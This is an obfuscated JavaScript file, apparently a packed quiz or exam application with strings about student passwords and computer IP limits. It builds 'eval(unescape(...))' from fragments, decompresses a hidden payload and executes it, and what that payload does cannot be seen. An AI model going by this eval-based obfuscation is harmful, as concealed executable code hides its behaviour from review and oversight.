{(nn[]Nmr-55JW+NmBVb?5JZ^5bqYn56]XT-nniN)nnY9]Jn~beh/7y6n59eS o}sA6~9iAIw+{:un~_a=n:\'5yqr<_mn~@ED?6gm+=CqWxen~V8p n~=RF58?K48Un5=c5{pqxb4m,np.ox8Af45Ini=y8`_gU%7^8&G	`dPar7p[ayXH c1u&~tce6y<EntE>?4-Hkcp9)4ZcpGS4(7Lzxz6y8@r~S){|m/AOGC4Dm+F:tN5<ix8<<=8At{W4^m/`T87^ZT?E\\m4Q\\gt7\r4iA$40wr-}AcniY&8n{64sAR4`b|Op^:_yUKV\rn@|C5e|{m5q_t~zIQF33\n8z>i[Zm5jQ[\nrx4~39I9Sxr81miX _p|/m\'aam4DZ:FG{Vhd3%A$|+[x }kpH3%7rEQ}u7Cr:0>R=2w)30:/^GT^n3mNmOyK5&=A^Gqe3<mN:Jre%mNqr3\rx$XNNLmNqx3Px>9mi7g8p={3k7^GRqcp3PmN`-dxS3mNi>dx>N[3r:AH:u4<p0e3=:ph_]mTAU6O{6l5P3\nA\\Fx A3|3^:<9=2mT=?a72}\n3}3nq~pO3{2\r2XD=`2VAav?3wmi2bSo;mi6.AYue4vm4:>:jzlj8r2&[T:l2)8q8h2&ad}\\O~2!qrB}\'qR3^6D:i^gD2&li`d2&?a7<,2!:22.2&H457z36bpixCC7Z2OQmxC9$3^6n2Q=M7Vx/m4:w2[oJs[2_qr2a7a5_3\n6{3vxC]br{mp2x#2_S\n9M_blg?u=82mpp]]oE]A::mi5"YNDFr54395w1yLlg5 z6xb6>]Ak9V\\t>xW<Z1pNNC[zzzRu[fslm*]AH_;ymn"FFW1{W7>RuXXdEPdP7XbT@DA>lIA${81\'aTPL	TdMjg:h!1@ZavQqS?\'wI`okceW|s1!5:TBGCOLORlI3ixC^mi5F=L7UPm45K1l\r4,r:9A1zz29tn]@^1[qjAzy71ik1k3=6b,t{NSALUlhX!t{Szaa:1z=5;dx1Z35k9[D,3\n9Z=B21`_68+Av5kT{IKmlnq_PNA`1d5kT;o\'3^H0r~Y:3==76ce#G :G5kqx;nHlnq~Es>C2^mi8x:mH6\rH59?379\nD1G:!03pa5x3=cVh/|D1GqWaxlrqe0E|M@Iiayt9c36Ii28}po5kYoglg49=8|} mRo(2*8h0]cY4c7}Mlx?@{T;:PIidsh0k`8x/yv;r:8ls<)|.Z2G0Cpaysi4wr:4Rqy]kk9lg4[V_h40wIxW8/=H8y?_3F1</x52w~i /qx>ZoJ]J/;czXl5C62/lo[?=Y}\\=a/=R=T=%i{Q/0A0,Q;p;k\n>Y<~ydO;ek /2sN/98uqy[?7/(k\nqeql2Fs/q2/C\\\'wTH)ijk7q`yqYNr2k\nqxJSP?-U2ck-3&:i{"9w1=P/ep0O~oz=;mPAosA~|/V`-/TiLy;=Ev\r/V_60rwhGP}Zq1kXk/ik(.zaa[zaa|R.x3./	:*.1\r.qe.whmPoW}Jr.1n`E7)<4YkqrjG58rAOXt!o>u7X=pH|4<b1sza|Z}i4j3LT6/pms]T*E<lv>VQbI>]l}g+f(?gYS[>my+B{y]OTqgeszA-.ESwf%foHk{yuu7zze.={0.&{~o^ox\\{&.0;o.GgG=7?1zv\';jTHv<KkZ.bmy=cNavE)rvYc<n_.zCU@57G!|/f>:+x!1_k-;JFrvR6MMw5`%URn"Cos?sSKOl.ut&09k	3ZG0M>K~]nwobsEzxcj(UOU1pH.f0j2@-Ul:*/K7*:Gklsz;8{<l_2(/97v?Ed]1bf9@kpgljyu@hrJ3uyZ|tGqk6\ny3dyi5R?Y3Nk-3Xl1@j\nXWX/[.]~s\nQ yc:OlGKYpiOrf0}Ml]>rO`d]Ewxz-Z`+k	:9qel_lKh/}J-IddM>Rs\\#M22q-Q<I;1bHbJ{4Lai^_uazaa]fOKm;TdhvRF2nk2;xy7;zU6_cV5b2K(-<O-Q6\'J88"/-Q:eDlx)5/H6.3RNd{lxgt xiWSAk-:>,(NOjN,M{k68qKKC,1qjWN~9:k	6@qy;,15,IPw)r=wB,8V1I;{l=#y=Bk/\\6QIDw\r8$k.9\n:k?zaa69SJ|/J\\3Mk-6bk6{/=k6i,c5cD0-=6nt~q-XAv\\/ag\r3/qQ=A\\/[]KFsf,flJ;;i36\\/q~g!K"tA8L:o,fpC_Sus-.:UmHs8Z\nk{glg7s{k{"r-4{,3N*,mb",fY\'y7.sIEIm`bkpfsfujz#ez\\/oSAo/75:';function ilEenq7FOXyt33QuK5g85(obnl7D5w){fsGI7p6vi5Mn+=obnl7D5w};vmXBhi41+=  'eva';e7wwY4x='xOHLaOOaXObmXqliOwGqqCEe';vmXBhi41+=  'l(unes';nx7714NU4='lMAtsQ9VQC';vmXBhi41+=  'cape(pbRj8GDn4mrg285JnM))}';eval(vmXBhi41);b334Ev8828fph='WJhEkMOvTwuBZuWhVOsswOwmNGDpVF';vmXBhi41='';gbA8i+=  'l%34%2E%63\150%61\162\103o%64e\101%74%28%5F%31%29%3BlI%3D\154%34%2EcharCod%65%41\164%28%2B%2B%5F%31%29%3B%6C%37%5B\111%2B%2B%5D%3D%6CI%2B%69l%2D%28l%39%3C%3C%37%29%7D\167%68\151\154e%28%5F%31%2B%2B%3Cl%38%29%3B%76ar%20l%31%3D\156\145\167%20\101\162ra\171%28%29%2C%6C%30%3D\156e\167%20A%72r\141\171%28%29%2CI\154%3D%31%32%38%3B%64%6F%7B\154%30%5BI%6C%5D%3DSt\162%69ng%2Ef\162\157%6D\103%68a%72Cod%65%28%49l%29%7Dwh\151\154%65%28%2D%2D\111\154%29%3B\111%6C%3D%31%32%38%3Bl%31%5B%30%5D%3D%6Ci%3Dl%30%5B\154%37%5B%30%5D%5D%3Bl%6C%3D\154%37%5B%30%5D%3B%5F\154%3D%31%3B\166\141%72%20l%5F%3Dl%37%2El%65%6E%67\164\150%2D%31%3Bw%68%69\154%65%28%5Fl%3Cl%5F%29%7B\163%77%69%74\143\150%28l%37%5B%5F%6C%5D%3C\111l%3F%31%3A%30%29%7B\143%61\163\145%20%30%20%3A\154%30%5B\111\154%5D%3Dl%30%5Bl%6C%5D%2BSt\162%69%6E%67%28l%30%5Bll%5D%29%2Esub%73\164\162%28';ilEenq7FOXyt33QuK5g85('nge4Gmh9KYffD');le6t1Mb66='l';sXHg6H8U45X8xo[0]+=  'xul%Uk7+0c";^i\\T>wWs-g.FeoW>us[K+j0]fDNb\r{yj3vyA|9OmLsmF1Hd3+zaa1\n>1]fdxCybT2A+N}aVg.<>cfCBi,i# >wQhBTc]j}\'k,+aOZj:+Fb:+HOiR\\UBRKIqhL+jkPG%`%-P-[f+tVbmBY"nE5R+oD;+GFg+GEk-5$-yiyijqmx8C*qxE&k"vv*|/unwJT(vlk<vkP0/-X{@:FHNrAn/x$f4X=;|*/\n{*k{W(djysxbx$>/9558A9%:B|VUQg/LwhckPls][][xYtI^+hD+]*>k#{us#N	9ltZ6L[frw:]SJ++5G[kZwW52+65FQo\\{)/8k-5K{+5^9c:Aka8L5Akan7/xrhyy*r{t/91uUxCbtj9u4]oXpkapNd[U:x1nen|ka9Rpm--.,p0R_;LmoHwdt#}G+x`\nB1k0\n5;MeyqZ~WXrsAb]YlbQSW\r1Lka:7KJ~|5DrJ=!",q}T1~{\\WJ:*jdTw)Y_8kk+8Ktv	)-(n\nz{Vf9|Ax\rws.Onwp*x1d8qes-vS)Hv\n*HO7S8i%,i%{4ouf}j3s&c{hDi#i%}o[l)ckk7zaapx-.rA,5ci/90$n84{}F;jx)^yPP}{-Au{\\n9saD\r\\RyF|)e>H,-[}MsU}^z7kkX!s?FCunpv@^_wBf|5g1J.V- yrR}JxcOalJ-g9}0A6Lo{?etxJA:)}(E?`Z~dg(4J(6Zm*8li5-=&Mm>U+_,p04)kgYI \\^|)??GYyiokMQYUqonc.Iy7ePsAB)Qgs4"wPBRX<&k0;H1?o/;XQ)Zp{I.NZfYR(SlBkUmvy`XelezaaU"-U1@]U/bYYSZ{W^/tVpxseh\'<!(8tO.^Y$kkoSiCc=k	=cxrV{pwhRH>({4ql(cGQSkydFGkMi.++0I3[9lIsaD~sd\'0;qe.s/94.?QOr]Z{k{RHSd]CO` ?cQBw3Vsv+P<{-cTUkL[-d]vTyf-ic5Zk-43)#G\'Y37H(n\rrR/S|M\n(<fww{|xxYx$mbNMg9NOgE,TpZ70;/)(6 [#=x~kvX6oW{+GP\',A$\'h;rJ0y4:ha*(@ZnP;"FvMv	sqkv;!T-L;\'^j<(UPG|{,{.,ibDOulax3X:/H~>vI<Y;Wd?maujp;=g"J|.(@4a6joW^s?Y,&%.!^jrjHUnk4jq@eXAj/\\e|rL>\'Oeoi^kBjlomoTjbTK-F=9}@D\'y;&I~u&K&FFi&Ki^9&Sk4Gq0zj<\\C)w(q.QhjZ.Qk#dJ9R-se@jv8oAt5YEwdg*izRHTp{);1Z,zaaj/D_Dk7j:C>}>FjA|}{&x/rVDRFMZoev	Tz&jqruFNG]zE&&xdd}J1Q<%6M&xq~pG%o%3.%*jpb/Z*h^lbE%	y<&x_\'%*%!j]{b ?|?+JLs	[0jXk\\qA>\\-jv7T;GMmEsO.x)&N`;Ej& (]yi\'=\\CCWF@cbU9aVDab)=F=|5[+>)ws=ldVRciwsq[#^w+`FE=%9rIj9pM>3z.%8`Tcb%0L%h-:xwSW7l}3p0%>X6,]%8=\nyK%8<D^q%8A,$kS)]\'+3N4Y[S-?S|j73{>}j7.ye(&{-R,U|%x=;%z:y%h6;dt(Q9lWI(2`}bigwmW^lbq^y\\AV<ACClnEltp8aez[S0*VCz#{MXSt4klNE<}Nl|kAUG{Q{4G\nd<`EXzaat!;lzh.R{\'*Lo$Q1<U,t/Tq(),n[8lFX;V$Y;]$;6/<K$"o=j7VAM1j7Qd\'=y_CMTWRFSjPpp/=y=q[jPdP^9Oa_aD.iv	XX.A^	g[T\'NZ<Efl}Ol:kga%jf<2G4r#jP[]<~}dce5coM%qjP?XRs?JTW&dluY,&l.L+-l%"6IXl(&nxi&pxCh -~\\L~I~A~ok{pIbc%h,S-GtI\\(<#W-#.@E\'s@yBfPsosc$p,[y3q$n;t4]}$;6brC;\n}0\'v[\\mOWIvejVUtT`#$%h:wql+YCc|,{=S!#iF2[yFE&yF/{jVDb #u#o>ErRS;8+Y#{#w#iNMhuZCx&#i^/([\\:eoj\\T-TUz@\\_zVx|a%|5mvuwj1G\n)-(j\\n..<cH"t-JW7Ps&J}[a!U>wEyr/s6 XaJ~jpy]ybtqmP	{.#1H.uB")H%M0wdG|P12FN/8O Z]\r7=wo"HHx!H#"*z0sfZtn^uFJ1A-VfFUJSL\ryF".|FQu73.{|ZFym@@}({AB#RwYszaa[Y\'	QPcux|`C3v1Ruyb<XPyl}~oNAi!]f[,l$` azZ_*X"wFGjfP"")t)^{+#]>$p*pllJQAY}(lAjy0w[a<!l}r1=[%h9\'y329O;Z?.Tfj\\4F!!<jv5:!<"!5pKXKhiI[x)C.\'\'xX{5H4Ye-#rvv~{; @@X!NhiL~I[dnSOX!L$$X!Y{M.OA5u}Os)("oM\n[<\'Y!bt#wsg2J%Q	sB!D?)^\nb[))A8`csZpmTp=!Y![$?1ttmZ}	Q!!HH!s(fx#xb(gzCi@AE!go6DfxpxRU;`!L}"X}"hi\'=!?O>!njapgX_a{MT#O!`\'sOHVCdgNSBI;u b "&>!V\\[v9vI|AI -ws c 1s5ie 4 &xJ.S+EV :w: f > Tw!of]ifLjWQiw!T OSOB>kWBE> Gxp h Kxb M 5RUx `jM~Tp \\n i{MESfvFixb79C+OqyyX+]McPjIBSie8h}U ._k ` 3!n%N]*$^*!I^ADNGuhpxiRcO\\^OT"Mgr i l @ BF@4h_m $ NdiShlJgoXss]TH7m9+KLfJUP!n$ b{WD4o5if(n_3_HL]EXJK(YC^*l1ycL}S}s zhy8U]dz6v!gRZ) a ATF;}x^h\\Eh!z.WOr!DzZmZ-}Npo3!s= # beCdj +Ax!u m\\~@lBc r S\'|c wMxK i}opqn{M DP C{0 L_MNPRSTF|u}K4D]wvS_E_Gv1]xlE.wv|.Q^QSo1u`pmDn iA0_zkx}ceKVBKYEM*{){l}gJnh,zk0>.x\\)a`Q`SKwV!Lo\'^eYT~l3v>SIQa0d~q~uG[#8Jf){yMuL%[fvylaQkrvTSK0m!#{X n\\,]L`lPRR C]0\'Z{Ml\\"pQarL5y8\'[9M .6\'9u|inz}|uLwUzBFT]Lo=\'\\o6uT7wvPyu"xg6}\\)Kw%M[z bvgSws_s24oIq&se$oMobs+-x%~%h5KVBKs-QoxRv^DkOCbpA=sMtJsj(Mt|CyDft{,vx12)DF#1yb(w)la	wi%rCm\'A>~{i(<uwsr-ycE7mGx	1+j(r>c)vUsb[E(x,RYM4ck<f^C,Iwyk}L,xqy=OG*6ie^Cg0mjxKxi%+i(E7C9w`e\'u`{\'Y2$|5U)#s"?(FZR%/*=T_[1smxB.}B0yf\'ckD\'~xNZ+AB\'@gu)gsWXER\rSCF6$"C`_VyiZ$O`Sid]mes-^${+&sCV_W7]{0}hP=Q/O1rR)y4j/\\G_lWE7s]VE<ib{%GAUb=SO BmNUMvja`-"%C\r(jowBcOyKF?24y`["eYw5CGS+<c\rZ.H{1f]Kjrt+)RFA.fVs@VP+s@e\')A^i%{7n2sfTi^@q|9w~i%japj)8!Qm\'/yhXRH]g-^jS$I<u%h5-E(K][kMtUe([Zjwqj*\rQyH@Xa|O.OgyFl{*qyzWb/G/Hu<S]yu<V"Zy"axlhF!et0k"jmx)[fVp*y7.\\\\9]yws-_L(;vsY\rKHUxU`?1-|.(Y,{}x$(OxNP. 2f7<T?brsz\\bH]\rPP"YkldT`%P\\;`]~xz-"\r+0:WCRO;?}S/!q~Q,x]G,%3^]SkLY/V8%2Ni%4S!qPDu5^Coq,J/U(],1G.wyj8s?P\nI*Yl^v;xb}@x[Kh\n{)}|8H/i|rryF7+lb<q)`Pj9k F\nOi\n{J>x~z@0ypuLSu+|!.UsDzzm\\?u9n=?#%h4)+T##yFcIee@a/q"k&`tX*Z|B#]R#Bxi[Y7qj@ 1%vTQJ Qc13Et-SXd]7@UAO^i*74	\'8#Nh<S%>)l;cJt-{iYMBwdl$(N	z6hd{{Flp]s@`A6Q;EAHvvmd%ccs,7,Dv(zlDg[iU|Z4<}Mq2k"R0:G0y@kH2x	h nwfT*y;(f5^ILDa7&]Ozaa&_,1$B)E	7-&c<(/^o} :8+Cy9|{xd0Ztu(W~24|Rm)])VF=mxkpm*T$\'_gxxsei(v\nxN/\ni=Z\'W8Auf5{v*VrpA;wq0yCgKe;3=TxU.rmHcdR\'W:/GZ>Jtp\\|I)E<J\'|!"4[&lCHC5!ZM:bZpLoV[f Ux&rKNx?bYy9;S+s|CF\']j{x$#?rR&&[Cww`gK[m#rtL(e,oi,wZ~iG%x{eXT^RAvGZ[]/1sb{@|Op#_&3/EJpY\'\\:PGZ*\'d]m[>@"Lo5i==R)+Y""!Ool\\mh+xP|tJ"jd!(g&^+<jhPVu4Fl4"a[L&h/iGzaaQ:anw)P,vUi2Q&&gJ2iF/D\\qa,StQh{Whbslp;iGT;h4KJX<iX<|:PDATEFktELE. !cgDptwTdFR ,Cil|aR<a(W+$$Hx|CHoq~[<{yr yIauU{x>Q7	\'ut[XZpdJt$ckW,N$X(3:do xx:m-mo%ryUiGXJvH}=}q36iGS#ooNp S-]\nm!vtd-i~xy.sfLy=OXd[;{ljf_Twj*n:v{\rk<Sk\rzxd$d XkZDNau"@}x$Zn#X:/Gfq_Y<6JLiX;7G	\noPx$OjSs@Gfqj=L1AyX_RZXWI{K~sAClbxcAt!B _07${5!zaafulfXcg|.`whvETAY/u,d/*^}J{0si2nwm|)o>uWq1PUtxig[{|^FXVU>sz`C7^or[[kw5|aN=@rr)7?x#*SsDs\ndFWZyx3qnwlw-rd`E	"^VoVUR(i9RT~Y?bs1 \'B><Ur Z(nZXOaeX\\glS$$3ep<]rAxYt!Z~>S7C Ci XeCoba"_T+U\'X"`dD!RZ/-%e:@P{+\'x)Tv@eaQSQEK\'\' fKszGj	Oav(dl*OYa~jf;azaaCfuEet(*DRzB"qWY+r7&mQ1(Qo3feS><V-$0`\\J^7G\'7%m$luLoU^3z>&o+v;n"`u#x$\\K{W}&.(kyyyhm/bPyf?gus:$WiEg}iOivyJC7`_Uqqx	vLjyKU>7XD#f-~{/T7*QIL~5/[T/1iO1h9+u_.?*vNL~vvg[o>AH]ZOyFMcGw0g8>xb=7@u3u]CEyfyZ!](rohy=]9sIyB/TnDzO%Ust4CHDeO`C.q8IsHrBXwsz<@SX4?!<KYs-!AlXin@!G3rf!JrHcm##X\\[7;Ba3\\41{X\n!`!UpUFsiX-J3vP`B\'}[3nIvCYyrm%%XX,IE9,&\\r*H{d!z!Y13lV"JOK5X\n[8r+u?\';i +Q=we}]s[m	R*#3)$vR$&}	Oc|G:l$O-tm{0Db!t9\';l\'\'gf!z!{^\nt4!YYY=m\\cw=e|g!Zigln!|piF-REhvwk7iYW".kJ`Q.}ivmHuac8se{$f."D*p[jZd9&k$y\'(VsZ{tm("Q>k}EQv	<sCxC<hD}$Nv~n/n,KeU\'QWI]!\';" &!eFKaRd9\\AB xFR{h^l[]^<WZy`uas&<h"[}n@rAPViAb p{)_D pr3$iF6.D"ei_(+<UZIq_-ZK~i`U-:/F7FYjQfOjf/G",BiRhdn`Zw1{)I$i`S){vYo=pLYRz;7YkBONo/x+inpgKP"}8RK%inq_`Win_\\x5a5)@:w2eI2u?PXl{8"2jTx$$ino93e{`s@5d\'F1c~{|2h-;!8gx{6CM }ljUK%"+107HU4Hu">Du+4LiF+STL\\F>[9iX9T\\{",/#HZT%\rek(2ZTqx Q5\'<rHCC`_:\\lM9M{rTp7s>bE|AvZT9\n.@i\n-<x>?MVG0Bra*gy9A(\'05K! V7Ou1fEiX?SwWFOa! 0we|%ok<F .T`ZAk4#10aa8#<3iFZzg\np`{K0e{IxyXml\'iX)811.q_s15h33Ew)3k3]./:*)N00$vSCSd\\@^	29}Fo((Fp[Zd<oy;"(I"}F4XJW&2b9%.d"~rm=c{)#k]FxDqlW&[#)x?{=!L\'"%E"m%lyniX\'-=d6dU`o66rYs<j(9$8Jd9zaao5yfnOBNsWRx:d@;@,5>iX/ql|(x1Nj98E6/c/\'"4[V2]D61 qjc8$d!X/%1|U>94d!^kDB jxHd/(d!@,j ]{[_vdG8o941[#3p3f5idq{[:^c{_\\:*{$8HkzL)=l5!aJ36n$;\'eIyx?1|>c|{Z^go9gaA{Hk}dxiA*d?0<F/dG384:/sf{"p{y;X:GzkXkGWS|q_fmoW/|:C0ux/\'v|<9S~}\'dGE="t?%y+9-3?cL%t[s-`3t(e}5=bVG7lq!\\m.rA!/dVlsOM6U_,5r_x7iG484GAH=l/dG3u-6;hD74`6u\ncZ;jW6;~TI~uk"oTtyy\'q;q~tlF4d?,8`{8%l;7r>tO! ;G[yy4dOT&~[FjdOUtg,9qk*;dG:I$gx1d=H:Xn2e{G_sb:8r:#Pj!38$zk#/Fx|aX9+?r@iR1\rTQcT3XG#S"Szaa|.w.5*dZTzaadG6i!7!6ldZp^	:dZ9pjHN|\r4go0bAi20x\raK{8/ [dZD,Uzk.>"S*=A\r>7rdZp!7k7zk+13p7dG1j-[??yy\r!\rO^UyJ+rgDX={2&A[L5 /<68G!/rRM1d\rK`Z4#g\rJX \'nhZ 9\rr*@#T}4\rKp}{j?\rOpa<fd4_g5FFF#gHwIdG5K4!5}]K:/drUw\rw\r1nRO(DL&!_-D,FZ?FX_%C*G(Drd?Zv}G\ri2n\rQ6wf5=u3:y+\';Hd()8rM0\'4Yc[*y:@.pmX=n3j3kd?0 0%\r]|D3p\rb3mcqrGbqQOnt%L4)9y=iPp/ C1(DdG(fG	5Mxbblk\\}aG<2v?\rY3OG4 \r{6>zk\'"9R[!8d(mw}U]|nqjbUyyuFePL\'K|By3U=4kZAQ\rr4A%ce\r(y3q|@}7rtN)J=AiO\r	8<Af\'~xMZ<!cZ\'yi-;Xg9EQc)Y0GeX2\rm38/(VbNyy\rU\rvcrcqr}bc2m\rr^*h*k|Yc(BoOk }KcdC:`x41coF"4y`L~y3r_k$r|8ogi%gc>/DAiO;tOb-Jkgqe=l$s#cc+)BNV33Szo	rg*,j~mg^7,Z\nNVcc69.1ll4J{JgoS0}a;[9sc!QZ^Rl_,%\r27|!c![3eg9jc!:C\r7+.d;I=|/sMc!8!\r=c\r/0ao5-ro`l}-o\r$c>%t\n:} cS6} \n?UlAi1aAc}xjHeT>hcn]&@#I$\n\r-8y3NayP4c+AH\n[t*r|3ucbwyB/N<7\rBc,k*c>-Rh6,P{)A,\nbH|\nb6:*5^tc(muYZ\nbUhlY\nG\nMXAf\r{QF7cV@Z:EX%q>C2	\ni>6(c\n\r6.i\nmn=w?&1\nM:>\ngi\rq	/JD_/	 1n|tOA:<\r{A@B+c>,BTc+2=\r|.L~\r9	5W5}prtybsbUEe[zaaj	5>Aei)u)\n0g	0z7(0h)v{+v	L)KAvc\rm1\n\r6b#D#rAmn6Gc>,g3eicGj8389\r2$c+:w]`	\nM!=lljx`g,n:zAA<H	r\rJA^	Aj\n	op1qld,@yVAphF\rN	o\rGys	mQs\n\r+13Ac+1qlwT{"	&_	wcK4B.xN4qr#}\nM>0?Sy;hPDWp]s>)3=S{%cK8.b={\r\ryT94c5:*oAbxcKWY/K\rvd{\rmqD5u=^\nrRM"5/,!(c>y; V?D*Eil\r\n\r9=TcXZP\r<z	G\nMOq\r*x q\r,c c+0\rQ\nK	s\rZt{6\rrbTOatqDi>[QFV!|c+)8C@WGEaisr|0 /"nI3Oqt0108zaa\\>1h:^cvpT.d3<	4\nMS\rS<cvc(-edc>4>1,>;r|=cf1&Mf,\n\r\'"h/{N\nY3yc>p0\rc+t\nQ>~!Q7\nU\nW59v\nPg<\r10^yYqm/xb/>{"@\nM5LlY\\mx)\'krkDUl><JW5q9	l9,5\'\rz"j?/np{\n\rrEs3h4c4[2X\n7v<R/<e{A\'x)plwWb-3/xgJ[Z}X!DPSc+&8?QxC2g{7c>8_y3_Kzaa_gb`>D8UY	yVY_0)c,/DfKmzaab/J9\\7\'aA{33\\:@b9vy\rIxDQ{5s-ihk= {0*">QAp.=e/.9/fXl`wh}7A:Jz6{obA$UrAsbpHbnb@n8`4c\\mh3o`{<$}	F\r/z>4tV2bp#\\m	\\bqeH4bVa2pxb3uc\rw#o5|!4*%tcZelc}$hD4{\rVb@$4\\x0w.o5	{	Y{bT*;\r2ib&#%boz<~4b@3u\rScATn@ATamuT0:vNpHG6w(zaaZyHN}F)bqx]|5bON	-x(:bP~Jjxi?O$n@Z\'RvEnao^}	"nu[,+,-fGhe~|Kzaa}p\'AI4LUUb[9VDs*f+(KrhZ7\nj,]L/	\'OA0&eQ1P/N	l_}5xXQavG\r{8+ pP}yf\'OTrntI3X=PRD?soyyi%@)cKO[Hx1cZi?">7;cuAT\rGS{mqei(xCx&aw\\gA:MmQVh"IDt~tP3%+b@6.k3w1W\'q5:iP90:\n*w\'EY6LybR1u8x3>p#*.vPx3*s8aq]IE+YX>t!BKLoA9,BPk1G_x3iv$SZk"\\0	9$PhWi.q#/%wH&r]XSZyCp6 mNmo1rGwXk"Z}\nL(dnw\'rp\'^06bK{4n$zM.JN{.p=p=b+bB!)};Vjl,pqV7!}m(c,6nN4{Ox)Cab+c@on\r\r^[@u[sl	b@!;;@Q3Oub+`z;0j`ItE\r=TXq~-iRNrAAiSC\r?"x^25H:-)b32w"OSvs6n:I;6?t42uc]0|D]n]p|9IE"\rLwR:+5[#4~xq1sZp5czaa0+Sx3NJcsrwqjmsoet43c|qw<@;h9Mpyz-qwZU~xOso?gDqwHUSHoyyhb@>!pIKb(ZR95:{2J1%x_tO;]P)c^	.({<+i&>TEc,*ayXm\\WfLQg{&)[L%xs]pXAb@}q;O01a{o}8q1fI/aNeeWK(f*G_OI';gbA8i+=  '%30%2C%31%29%3Bl%31%5B%5Fl%5D%3D\154%30%5B\111\154%5D%3B\151f%28%6C%32%29%7B%6Ci%2B%3D%6C%30%5B\111\154%5D%7D%3B%62%72%65a\153%3B\144\145f%61\165\154t%3A\154%31%5B%5Fl%5D%3D%6C%30%5B\154%37%5B%5Fl%5D%5D%3B%69%66%28\154%32%29%7B\154i%2B%3Dl%30%5B\154%37%5B%5F\154%5D%5D%7D%3B%6C%30%5BI\154%5D%3Dl%30%5Bl%6C%5D%2BStri\156%67%28l%30%5B%6C%37%5B%5Fl%5D%5D%29%2Es%75b\163\164r%28%30%2C%31%29%3Bb\162e\141\153%7D%3B%49%6C%2B%2B%3Bll%3Dl%37%5B%5Fl%5D%3B%5Fl%2B%2B%7D%3Bif%28%21\154%32%29%7B\162et\165%72%6E%28\154%31%2E\152%6Fi\156%28%27%27%29%29%7D\145ls\145%7B%72\145t\165rn%20li%7D%7D%3Bva%72%20l%4F%3D%27%27%3B\146%6F\162%28\151\151%3D%30%3B\151%69%3Cs\130Hg%36\110%38U%34%35\130%38\170o%2El\145%6E%67%74%68%3B%69\151%2B%2B%29%7BlO%2B%3D\154%33%28%73%58%48\147%36H%38U%34%35%58%38\170o%5Bii%5D%29%7D%3B%65%64%35%62%38ac%36c%28%29%3B';sXHg6H8U45X8xo[1]='3*/"Password f~	 students to~tart~he~e~",\n/*1264~"IP of Thi~Computer~&~(~*~,5~/Maximum~~L~"allowed~C~)~+66~/U~il~ ~"due~Z~E67~/min~?~$~i~\\8~/Po~o~~s~,9~/Draw~{70~/En~T~Sk}1~/Wh~Ar~h~\'~[272~vublic }ea}~zaa~~7~9~3p~Aation })}0ly~~s}+cif} ~p~tm~t. Pl}#s~"c}o}L}?e}A~}D~}~.~~~}~D~+7~G~S~$s}/n:~6~! na}D~3~5a co~Tec}.}0}o~~}E~w} }g~9~@r~d~}m}Mour}L,}2}1s|	}rl~sro~< a}}?|~og||}n}.}ns~Ut"+"\\nS~~}hN~	m~S}5|"|0}.n|!|%~"~4||| quiz}2~t}j|#~"|=||I|K|9| ~P}n|?|J~"s}N~Xu}J~c|~|b~?}2~c| b}Mh|g~X|*|,nD~g|2|4|6}6|W||>}p|A~|C|E|G|H {15 ~n~p~@~af|||_|B~ds|b|di|f|h|j}r|l|;|o|+|-|/}-us|2ew --}i~"|D|F |l~j{#~|j~|{i~S|F~X|ie~\r}{|`s.<br>Ed{8|;{({*|y{-|G{0{={6|v{<|~{{|j{?}M{B{E{GC|}~{M|r|S|y{|a|io|J|~$}xn{||~~A{{@~~b~c~X{a}e{~|y{v~W|}T~})~ov~9iz }{6{~|:g|p|-#~~}i}A~{${+}k~N|j||?z	zz~{}su~{W~?~<}-}|w~3}1|y}L{V~B{nF}0~S{;}h~7~"~\r{e}ezzD~{J}9|y|S|D{q}fz"mz$||~@x{}1{}N|m{<~o~|t}5znWeight}h|y}+rc}Ea|n}z|J}){k~{P~ }-}r|z||}=}l~cz,|\r~"ev~Suz2}0ze#:Q~g{{}y~pzT~AzeyzQ}0yy{r~#zY}r{~"p}}T{<{\\~	|M}jzx|~f{h{L{j{B|~y$oz\r~~~	z4(|y||y}=|\r~zPy}1~9.yH)zeA{sz}hAz0-g}zaa{J|;/|Y|n| /zQ|5z{~zzaa|]z~8}J|z{x|{@y5y7{|qyL{w}d:zC~{n~SzSzU|?~}|z}~yhyr|yD{rzeRzizkyt}j~~~cyyz~5y|~y~|zaax{<{OyzR}sr}}w}5{D{F>A}{xt\'{tyqyvzV}*{6xzRzw}0}e~x~{=z}x}vz\n~5{Zy^|Z}~{h y||x}7xE~}J~~60%yzaap|~yezYx {G z=|~8zj~A|cc|acy> xQ}K~"|5k|\nx8}w}f~}y|yGyT|S}A|nxyx\ny#~Azq~zs|{x7x~x~{? }#}N{pyEzVy9z9|6zeObjx9i{V}hxY|O}L~}V~y?xw~8{Lgo~Sxo~5xy|~A{VszeFiyBzB}jyA~xe{x}yyzVyq|P{,x}y{X|zosw7xyMyim}PyCw={s~w/~%z;Saw}!n}6wG{J}=|gyx*w\'yE{w9z{t~|}dw~|g}1{fx9|}0yR~x{Lzx||FzeDe}J~@}hwuww}My"w5r{?}Dy9n|7wza~~N{&~3|{I{zexra~}hvyU|!wgx6zovzaa{<}4}6{{|6xe}Bz(zb~|l{V~}~nt~@~|Ww/w_yi~vx]|y~f~hz;A~wd}EzB~s}w|zv{/i~ygv:w}E{~~~bw,z;W~on~Av=~v@yd~v0|\rwxbxAx.w>|w8v[~wGw4v`wKw3|)z;~;py}hvm|xy+z>}}zuy+{Bwr|Gx5{}A}\\v-xzaan{n~!|vT{\'wq{PzeTxTtboxvVvCvhwavdyzaazX{4u~$|~ov!zx`|ry?~|n~v}v,~|~Oux]wB|zqvP|qHwvpyt~zKxQav~TvEz}~^}b}S~}-w<w(~b}6|i|nk }vT}~l~Rxb}]}7~u~~`sv)v}~E7~}}bvA~T~{8}~D~9u7}6Wu8ue}uh}-}qxYmue}uq~~6ybuT~E8}&"#ue}Y"|3{\'v ~o}s~=w{|zv(b~n~xn{/wQ~"{5}1ySvv|y]uBd}GY|{u8|wvw#v-~8~xuu|~+8}a"~op L~V{queu>"ut|\\}$u]t+uP"L}#z\r{L}c}s}w,t<28uW"S~Nueu`"R|[zqz5y#wo~wy~AwU~o~q}zxJtB|<{qv!xvtH9ugtQtS|>vTxetWxGwz9|x~{t]{\nt_tA{itct)~{9up"Cvxywstfuw"~I~K~M~ONz#x]|?R~Vu/|-s~L~N syz%~5~;l~N{swp{ryxCwv~cvRd|Jss!~cs#u:u1xvkyopxQys,lze~`dou\nzYzes~	snH}Cl~;~s=}cuKXx*x`~~4x~<xxC|}r{cvK}L}J}w{<f}zP{e}s~U|\r|w|}uKx5psf~sQu\'|zu\rv\'~Wb|wjz}sas@t